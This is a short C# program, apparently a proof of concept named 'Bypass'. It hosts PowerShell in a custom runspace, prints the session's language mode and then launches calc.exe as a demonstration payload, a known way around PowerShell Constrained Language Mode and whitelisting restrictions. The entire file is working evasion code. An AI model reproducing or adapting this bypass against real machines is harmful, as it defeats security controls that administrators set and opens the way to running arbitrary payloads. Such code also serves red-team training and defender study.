using System;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Xml.Linq;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace run = RunspaceFactory.CreateRunspace();
            run.Open();

            PowerShell shell = PowerShell.Create();
            shell.Runspace = run;

            String exec = "$ExecutionContext.SessionState.LanguageMode";
            shell.AddScript(exec);

            Collection<PSObject> output = shell.Invoke();
            foreach (PSObject obj in output)
            {
                Console.WriteLine(obj.ToString());
            }
            
            Console.WriteLine("\nNice! Eexcuting Calculator now!");
            
            String exec1 = "calc.exe";
            shell.AddScript(exec1);

            Collection<PSObject> output1 = shell.Invoke();
            foreach (PSObject obj in output1)
            {
                Console.WriteLine(obj.ToString());
            }

            run.Close();
        }
    }
}
